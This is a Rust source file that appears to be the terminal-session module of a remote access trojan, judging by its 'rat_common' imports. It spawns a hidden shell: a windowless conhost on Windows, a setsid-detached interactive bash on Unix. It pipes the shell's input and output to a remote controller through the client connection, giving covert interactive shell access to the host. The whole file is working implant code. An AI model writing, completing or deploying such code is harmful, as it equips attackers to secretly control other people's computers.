use std::collections::VecDeque;
use std::process::Stdio;
use std::sync::{Arc, Weak};

use async_trait::async_trait;
use rat_common::framework::{Module, ModuleImpl, ModuleState};
use rat_common::reader::Reader;
use rat_common::schema::input::{SessionInput, SessionInputTerminalStdin};
use rat_common::schema::output::{
    SessionOutput, SessionOutputTerminalStderr, SessionOutputTerminalStdout,
};
use rat_common::schema::state::{SessionState, TerminalSessionState};
use rat_common::schema::{
    ClientMessage, ClientMessageData, SessionMetadata, SessionMetadataInner,
    SessionMetadataInnerTerminal,
};
use rat_common::snowflake::SnowflakeId;
use tokio::io::AsyncWriteExt;
use tokio::process::{Child, ChildStderr, ChildStdin, ChildStdout, Command};
use tokio::sync::Mutex;

use crate::client::Client;
use crate::sessions::SessionImpl;

const _MAX_BUFFER_SIZE: usize = 8192;

#[cfg(windows)]
fn _build_default_shell() -> anyhow::Result<Command> {
    use windows_sys::Win32::System::Threading::CREATE_NO_WINDOW;

    let mut command = Command::new("conhost.exe");
    command
        .args(["--width", "200", "--height", "9999"])
        .creation_flags(CREATE_NO_WINDOW);

    Ok(command)
}

#[cfg(unix)]
fn _build_default_shell() -> anyhow::Result<Command> {
    use std::io::Error;

    let mut command = Command::new("/bin/bash");
    command.arg("-i").env("TERM", "xterm");
    unsafe {
        command.pre_exec(|| {
            if libc::setsid() == -1 {
                Err(Error::last_os_error())
            } else {
                Ok(())
            }
        });
    }

    Ok(command)
}

pub struct TerminalSession {
    // Common fields
    _client: Weak<Client>,
    _metadata: Arc<SessionMetadata>,
    _name: String,
    _state: Arc<ModuleState>,

    // Specific fields
    _process: Mutex<Child>,
    _input: Mutex<ChildStdin>,
    _output: Mutex<(Reader<ChildStdout>, Reader<ChildStderr>)>,
    _buffer: Mutex<VecDeque<u8>>,
}

impl TerminalSession {
    pub async fn new(client: Weak<Client>) -> anyhow::Result<Self> {
        let mut command = _build_default_shell()?;
        command
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .kill_on_drop(true);

        let mut process = command.spawn()?;

        let stdin = process
            .stdin
            .take()
            .ok_or_else(|| anyhow::anyhow!("Failed to capture stdin"))?;
        let stdout = process
            .stdout
            .take()
            .ok_or_else(|| anyhow::anyhow!("Failed to capture stdout"))?;
        let stderr = process
            .stderr
            .take()
            .ok_or_else(|| anyhow::anyhow!("Failed to capture stderr"))?;

        let id = SnowflakeId::new();
        let pid = process.id().unwrap_or(u32::MAX);
        let name = format!("TerminalSession(id={id}, pid={pid})");

        Ok(Self {
            _client: client,
            _metadata: Arc::new(SessionMetadata {
                id,
                inner: SessionMetadataInner::Terminal(SessionMetadataInnerTerminal { pid }),
            }),
            _name: name,
            _process: Mutex::new(process),
            _input: Mutex::new(stdin),
            _output: Mutex::new((Reader::new(stdout), Reader::new(stderr))),
            _state: ModuleState::new(),
            _buffer: Mutex::new(VecDeque::new()),
        })
    }
}

#[async_trait]
impl ModuleImpl for TerminalSession {
    type EventType = SessionOutput;

    fn name(&self) -> &str {
        &self._name
    }

    fn state(&self) -> Arc<ModuleState> {
        self._state.clone()
    }

    async fn listen(self: Arc<Self>) -> Self::EventType {
        let mut output = self._output.lock().await;
        let (stdout, stderr) = &mut *output;
        tokio::select! {
            Ok(size) = stdout.read() => {
                if size == 0 {
                    SessionOutput::closed()
                } else {
                    SessionOutput::terminal_stdout_bytes(stdout.prefix(size))
                }
            }
            Ok(size) = stderr.read() => {
                if size == 0 {
                    SessionOutput::closed()
                } else {
                    SessionOutput::terminal_stderr_bytes(stderr.prefix(size))
                }
            }
            else => SessionOutput::closed(),
        }
    }

    async fn handle(self: Arc<Self>, event: Self::EventType) -> anyhow::Result<()> {
        if let Some(client) = self._client.upgrade() {
            match &event {
                SessionOutput::Closed(_) => {
                    // Do not return early here, as we still want to send the closed message to the server
                    self.stop();
                }
                SessionOutput::TerminalStdout(SessionOutputTerminalStdout { data })
                | SessionOutput::TerminalStderr(SessionOutputTerminalStderr { data }) => {
                    let mut slice = data.as_bytes();
                    let offset = slice.len().saturating_sub(_MAX_BUFFER_SIZE);
                    slice = &slice[offset..];

                    let mut buffer = self._buffer.lock().await;

                    let excess = buffer
                        .len()
                        .saturating_add(slice.len())
                        .saturating_sub(_MAX_BUFFER_SIZE);
                    if excess > 0 {
                        buffer.drain(..excess);
                    }

                    buffer.extend(slice);
                }
            }

            let message = ClientMessage {
                id: SnowflakeId::new(),
                data: ClientMessageData::SessionOutput {
                    session_id: self._metadata.id,
                    output: event,
                },
            };
            client.send(&message).await?;
        }

        Ok(())
    }
}

#[async_trait]
impl SessionImpl for TerminalSession {
    fn metadata(&self) -> Arc<SessionMetadata> {
        self._metadata.clone()
    }

    async fn input(&self, data: SessionInput) -> anyhow::Result<()> {
        match data {
            SessionInput::TerminalStdin(SessionInputTerminalStdin { data }) => {
                let mut stdin = self._input.lock().await;
                stdin.write_all(data.as_bytes()).await?;
            }
            SessionInput::Close(_) => {
                self._process.lock().await.kill().await?;
            } // other => {
              //     anyhow::bail!("Invalid input for {}: {other:?}", self._name);
              // }
        }

        Ok(())
    }

    async fn query_current_state(&self) -> anyhow::Result<SessionState> {
        let mut buffer = self._buffer.lock().await;
        let slice = buffer.make_contiguous();

        Ok(SessionState::Terminal(TerminalSessionState {
            data: String::from_utf8_lossy(slice).to_string(),
        }))
    }
}
